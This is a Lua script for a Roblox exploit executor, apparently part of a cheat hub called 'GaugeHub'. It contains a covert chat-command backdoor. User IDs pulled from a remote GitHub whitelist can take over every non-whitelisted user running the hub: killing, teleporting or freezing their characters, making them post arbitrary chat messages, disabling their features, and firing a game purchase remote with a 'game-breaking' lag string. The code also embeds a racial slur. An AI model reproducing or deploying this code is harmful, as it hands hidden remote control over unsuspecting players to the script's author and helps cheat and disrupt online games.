local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local localPlayer = Players.LocalPlayer

local WHITELIST_URL = "https://raw.githubusercontent.com/f4ed67/test/main/whitelists.txt"

local WHITELIST = {}
local whitelistLoaded = false

local function loadWhitelist()
    local ok, result = pcall(function()
        return game:HttpGet(WHITELIST_URL, true)
    end)
    if not ok or not result or result == "" then
        warn("[Commands] Failed to fetch whitelist. Falling back to owner ID.")
        WHITELIST = {[5040205276] = true}
        whitelistLoaded = false
        return
    end
    local count = 0
    for line in result:gmatch("[^\r\n]+") do
        local cleaned = line:gsub("%s+", "")
        if cleaned ~= "" and not cleaned:match("^#") then
            local id = tonumber(cleaned)
            if id then WHITELIST[id] = true; count = count + 1 end
        end
    end
    WHITELIST[5040205276] = true
    whitelistLoaded = true
    print("[Commands] Loaded " .. count .. " whitelisted IDs.")
end

loadWhitelist()

local isWhitelisted = WHITELIST[localPlayer.UserId] == true

getgenv().GaugeHubCommands = {
    {name = "/disable", args = "", desc = "turns off every enabled feature + hides the UI on public users"},
    {name = "/enable", args = "", desc = "restores the features that were on + shows the UI again"},
    {name = "/bring", args = "", desc = "teleports all public users to the sender"},
    {name = "/loopbring", args = "", desc = "continuously teleports all public users to the sender (toggle)"},
    {name = "/protectme", args = "<speed>", desc = "makes public users orbit around the sender at the given speed"},
    {name = "/say", args = "<message>", desc = "makes all public users say the message"},
    {name = "/spam", args = "<message>", desc = "spams the message 5 times"},
    {name = "/kill", args = "", desc = "kills every public user"},
    {name = "/respawn", args = "", desc = "same as /kill"},
    {name = "/jump", args = "", desc = "forces all public users to jump"},
    {name = "/freeze", args = "", desc = "freezes all public users for 5 seconds"},
    {name = "/unfreeze", args = "", desc = "unfreezes all public users"},
    {name = "/fling", args = "", desc = "flings all public users upward"},
    {name = "/speed", args = "<number>", desc = "sets walkspeed for all public users"},
    {name = "/jumpheight", args = "<number>", desc = "sets jump power for all public users"},
    {name = "/hipheight", args = "<number>", desc = "sets hip height for all public users"},
    {name = "/sit", args = "", desc = "forces all public users to sit"},
    {name = "/ragdoll", args = "", desc = "ragdolls all public users"},
    {name = "/spin", args = "", desc = "spins all public users 180 degrees"},
    {name = "/spinspeed", args = "<speed>", desc = "continuously spins all public users at the given speed"},
    {name = "/strip", args = "", desc = "removes all accessories from public users"},
    {name = "/bighead", args = "", desc = "makes all public users heads huge"},
    {name = "/smallhead", args = "", desc = "resets head size for all public users"},
    {name = "/noclip", args = "", desc = "toggles noclip for all public users"},
    {name = "/godmode", args = "", desc = "toggles god mode for all public users"},
    {name = "/gender:male", args = "", desc = "sets every public user's gender to Male"},
    {name = "/gender:female", args = "", desc = "sets every public user's gender to Female"},
    {name = "/comebackcus", args = "<name>", desc = "sends a custom comeback name for every public user"},
    {name = "/lagcomeback", args = "", desc = "sends the game-breaking comeback for every public user"},
    {name = "/teleport", args = "<player>", desc = "teleports you to the named player"},
    {name = "/goto", args = "<player>", desc = "alias for /teleport"},
    {name = "/unhide", args = "", desc = "forces your UI to re-enable"},
}

local disabledOverlay = nil

local function findLunaGui()
    local roots = {game:GetService("CoreGui"), localPlayer:FindFirstChild("PlayerGui")}
    for _, root in ipairs(roots) do
        if root then
            for _, obj in ipairs(root:GetChildren()) do
                if obj:IsA("ScreenGui") and obj.Name ~= "GaugeDisabledOverlay" then
                    for _, d in ipairs(obj:GetDescendants()) do
                        if d:IsA("TextLabel") and d.Text:find("nigga hub") then
                            return obj
                        end
                    end
                end
            end
        end
    end
    return nil
end

local function showOverlay()
    if disabledOverlay then return end
    local pg = localPlayer:FindFirstChild("PlayerGui")
    if not pg then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "GaugeDisabledOverlay"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.IgnoreGuiInset = true
    gui.Parent = pg
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.5
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = gui
    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, 0, 0.15, 0)
    txt.Position = UDim2.new(0, 0, 0.42, 0)
    txt.BackgroundTransparency = 1
    txt.Text = "ur'e currently disabled lolol"
    txt.TextColor3 = Color3.fromRGB(255, 60, 60)
    txt.TextStrokeTransparency = 0
    txt.Font = Enum.Font.GothamBlack
    txt.TextScaled = true
    txt.Parent = frame
    disabledOverlay = gui
end

local function hideOverlay()
    if disabledOverlay then disabledOverlay:Destroy(); disabledOverlay = nil end
end

local function disableAllFeatures()
    if not getgenv().GaugeHubActiveFeatures then return 0 end
    local snapshot = {}
    for _, feature in ipairs(getgenv().GaugeHubActiveFeatures) do
        if feature.enabled then
            table.insert(snapshot, feature)
            pcall(function() feature.callback(false) end)
            feature.enabled = false
        end
    end
    getgenv().GaugeHubDisabledSnapshot = snapshot
    return #snapshot
end

local function enableAllFeatures()
    local snapshot = getgenv().GaugeHubDisabledSnapshot
    if not snapshot then return 0 end
    local count = 0
    for _, feature in ipairs(snapshot) do
        pcall(function() feature.callback(true) end)
        feature.enabled = true
        count = count + 1
    end
    getgenv().GaugeHubDisabledSnapshot = nil
    return count
end

local function setDisabled(state)
    if isWhitelisted then return end
    if state then
        local count = disableAllFeatures()
        print("[Commands] Disabled " .. tostring(count) .. " features")
        showOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = false end
    else
        hideOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = true end
        local count = enableAllFeatures()
        print("[Commands] Re-enabled " .. tostring(count) .. " features")
    end
end

local function getRoot(plr)
    local char = plr.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end
local function getLocalHum()
    local char = localPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end
local function getLocalRoot() return getRoot(localPlayer) end

local function sendChat(msg)
    if not msg or msg == "" then return false end
    local legacy = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if legacy then
        local remote = legacy:FindFirstChild("SayMessageRequest")
        if remote and remote:IsA("RemoteEvent") then
            local ok = pcall(function() remote:FireServer(msg, "All") end)
            if ok then return true end
        end
    end
    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local channels = TextChatService:FindFirstChild("TextChannels")
        if channels then
            local rb = channels:FindFirstChild("RBXGeneral")
            if rb and rb:IsA("TextChannel") then
                local ok = pcall(function() rb:SendAsync(msg) end)
                if ok then return true end
            end
        end
    end
    return false
end

local function tryFireBuy(kind, value)
    local events = ReplicatedStorage:FindFirstChild("Events")
    if not events then return false end
    local buy = events:FindFirstChild("Buy")
    if not buy then return false end
    return pcall(function() buy:FireServer(kind, value) end)
end

getgenv().GaugeHubLoopBringSender = nil
getgenv().GaugeHubProtectSender = nil
getgenv().GaugeHubProtectSpeed = 5
getgenv().GaugeHubSpinSpeed = 0
getgenv().GaugeHubNoclip = false
getgenv().GaugeHubGodMode = false

task.spawn(function()
    while task.wait() do
        local ok, err = pcall(function()
            local lbSender = getgenv().GaugeHubLoopBringSender
            if lbSender and lbSender.Parent then
                local sroot = lbSender.Character and lbSender.Character:FindFirstChild("HumanoidRootPart")
                local lroot = getLocalRoot()
                if sroot and lroot then
                    lroot.CFrame = sroot.CFrame * CFrame.new(0, 0, 5)
                end
            end
            local pSender = getgenv().GaugeHubProtectSender
            if pSender and pSender.Parent then
                local sroot = pSender.Character and pSender.Character:FindFirstChild("HumanoidRootPart")
                local lroot = getLocalRoot()
                if sroot and lroot then
                    local t = tick() * (getgenv().GaugeHubProtectSpeed or 5)
                    local radius = 8
                    local offset = Vector3.new(math.cos(t) * radius, 0, math.sin(t) * radius)
                    lroot.CFrame = CFrame.new(sroot.Position + offset, sroot.Position)
                end
            end
            local spinSpeed = getgenv().GaugeHubSpinSpeed
            if spinSpeed and spinSpeed > 0 then
                local lroot = getLocalRoot()
                if lroot then
                    lroot.CFrame = lroot.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
                end
            end
            if getgenv().GaugeHubNoclip then
                local char = localPlayer.Character
                if char then
                    for _, p in ipairs(char:GetDescendants()) do
                        if p:IsA("BasePart") then p.CanCollide = false end
                    end
                end
            end
            if getgenv().GaugeHubGodMode then
                local char = localPlayer.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum then hum.MaxHealth = math.huge; hum.Health = math.huge end
            end
        end)
    end
end)

local function handleCommand(sender, msg)
    if not WHITELIST[sender.UserId] then return end
    local cmd, args = msg:match("^[/%.!](%S+)%s*(.*)")
    if not cmd then return end
    local cmdLower = string.lower(cmd)

    if cmdLower == "disable" then
        setDisabled(true)
    elseif cmdLower == "enable" then
        setDisabled(false)
    elseif cmdLower == "gender:male" then
        if not isWhitelisted then tryFireBuy("Gender", "Male") end
    elseif cmdLower == "gender:female" then
        if not isWhitelisted then tryFireBuy("Gender", "Female") end
    elseif cmdLower == "comebackcus" then
        if not isWhitelisted and args and #args > 0 then tryFireBuy("Character", args) end
    elseif cmdLower == "lagcomeback" then
        if not isWhitelisted then
            local lagStr = getgenv().GaugeHubLagString or ""
            if lagStr ~= "" then tryFireBuy("Character", lagStr) end
        end
    elseif cmdLower == "loopbring" then
        if not isWhitelisted then
            if getgenv().GaugeHubLoopBringSender == sender then
                getgenv().GaugeHubLoopBringSender = nil
            else
                getgenv().GaugeHubLoopBringSender = sender
            end
        end
    elseif cmdLower == "protectme" then
        if not isWhitelisted then
            if getgenv().GaugeHubProtectSender == sender then
                getgenv().GaugeHubProtectSender = nil
                getgenv().GaugeHubProtectSpeed = 5
            else
                getgenv().GaugeHubProtectSender = sender
                local n = tonumber(args)
                getgenv().GaugeHubProtectSpeed = n and n or 5
            end
        end
    elseif cmdLower == "spinspeed" then
        if not isWhitelisted then
            local n = tonumber(args)
            if getgenv().GaugeHubSpinSpeed and getgenv().GaugeHubSpinSpeed > 0 then
                getgenv().GaugeHubSpinSpeed = 0
            else
                getgenv().GaugeHubSpinSpeed = n and n or 30
            end
        end
    elseif cmdLower == "noclip" then
        if not isWhitelisted then
            getgenv().GaugeHubNoclip = not getgenv().GaugeHubNoclip
        end
    elseif cmdLower == "godmode" then
        if not isWhitelisted then
            getgenv().GaugeHubGodMode = not getgenv().GaugeHubGodMode
        end
    elseif not isWhitelisted then
        if cmdLower == "bring" then
            local sroot = getRoot(sender)
            local lroot = getLocalRoot()
            if sroot and lroot then
                lroot.CFrame = sroot.CFrame * CFrame.new(0, 0, 5)
            end
        elseif cmdLower == "say" then
            if args and #args > 0 then sendChat(args) end
        elseif cmdLower == "spam" then
            if args and #args > 0 then
                task.spawn(function()
                    for _ = 1, 5 do sendChat(args); task.wait(0.3) end
                end)
            end
        elseif cmdLower == "kill" or cmdLower == "respawn" then
            local hum = getLocalHum()
            if hum then hum.Health = 0 end
        elseif cmdLower == "jump" then
            local hum = getLocalHum()
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        elseif cmdLower == "freeze" then
            local root = getLocalRoot()
            if root then
                root.Anchored = true
                task.delay(5, function()
                    if root.Parent then root.Anchored = false end
                end)
            end
        elseif cmdLower == "unfreeze" then
            local root = getLocalRoot()
            if root then root.Anchored = false end
        elseif cmdLower == "fling" then
            local root = getLocalRoot()
            if root then root.Velocity = Vector3.new(0, 500, 0) end
        elseif cmdLower == "speed" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.WalkSpeed = n end
        elseif cmdLower == "jumpheight" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.JumpPower = n end
        elseif cmdLower == "hipheight" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.HipHeight = n end
        elseif cmdLower == "sit" then
            local hum = getLocalHum()
            if hum then hum.Sit = true end
        elseif cmdLower == "ragdoll" then
            local char = localPlayer.Character
            if char then
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("Motor6D") then p:Destroy() end
                end
            end
        elseif cmdLower == "spin" then
            local root = getLocalRoot()
            if root then
                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(180), 0)
            end
        elseif cmdLower == "strip" then
            local char = localPlayer.Character
            if char then
                for _, p in ipairs(char:GetChildren()) do
                    if p:IsA("Accessory") or p:IsA("Shirt") or p:IsA("Pants") or p:IsA("ShirtGraphic") then
                        p:Destroy()
                    end
                end
            end
        elseif cmdLower == "bighead" then
            local char = localPlayer.Character
            local head = char and char:FindFirstChild("Head")
            if head then head.Size = Vector3.new(5, 5, 5) end
        elseif cmdLower == "smallhead" then
            local char = localPlayer.Character
            local head = char and char:FindFirstChild("Head")
            if head then head.Size = Vector3.new(1, 1, 1) end
        elseif cmdLower == "teleport" or cmdLower == "goto" then
            local target = args and Players:FindFirstChild(args)
            if target then
                local troot = getRoot(target)
                local lroot = getLocalRoot()
                if troot and lroot then
                    lroot.CFrame = troot.CFrame * CFrame.new(0, 0, 5)
                end
            end
        elseif cmdLower == "unhide" then
            local lunaGui = findLunaGui()
            if lunaGui then lunaGui.Enabled = true end
        end
    end
end

local function hookPlr(plr)
    plr.Chatted:Connect(function(m) handleCommand(plr, m) end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= localPlayer then hookPlr(plr) end
end
Players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then hookPlr(plr) end
end)

print("[Commands] Command system loaded.")
